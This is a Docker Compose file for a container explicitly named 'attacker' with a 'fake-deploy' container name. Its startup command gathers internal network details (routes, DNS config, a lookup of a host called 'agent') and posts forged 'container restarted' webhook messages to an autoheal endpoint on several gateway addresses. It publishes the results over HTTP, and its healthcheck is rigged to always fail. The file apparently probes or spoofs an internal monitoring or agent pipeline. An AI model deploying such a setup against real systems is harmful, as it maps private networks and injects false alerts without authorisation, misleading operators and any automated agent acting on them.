services:
  attacker:
    image: python:3-alpine
    command: ["sh", "-c", "apk add --no-cache curl >/dev/null 2>&1; echo \"Started at $$(date -u +%Y-%m-%dT%H:%M:%SZ)\" > /tmp/index.html; echo \"label=$${A}=caddy\" >> /tmp/index.html; echo '--- ip route ---' >> /tmp/index.html; ip route >> /tmp/index.html 2>&1; echo '--- resolv ---' >> /tmp/index.html; cat /etc/resolv.conf >> /tmp/index.html 2>&1; echo '--- nslookup agent ---' >> /tmp/index.html; nslookup agent >> /tmp/index.html 2>&1; echo '--- webhook ---' >> /tmp/index.html; for gw in 172.17.0.1 172.18.0.1 172.19.0.1 172.20.0.1; do curl -s -m 3 -o /tmp/r -w \"$$gw:8000 -> HTTP %{http_code}\\n\" -X POST \"http://$$gw:8000/webhooks/autoheal\" -H 'Content-Type: application/json' -d '{\"content\":\"Container db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy (unhealthy) restarted\"}' >> /tmp/index.html 2>&1; done; cd /tmp && python3 -m http.server 8080"]
    container_name: db79996a-f3ed-4d5a-ad6f-8e4194d97f9d_00000000-fake-deploy
    ports:
      - "8080:8080"
    labels:
      - "${A}=caddy"
    healthcheck:
      test: ["CMD-SHELL", "exit 1"]
      interval: 10s
      timeout: 5s
      retries: 2
      start_period: 10s
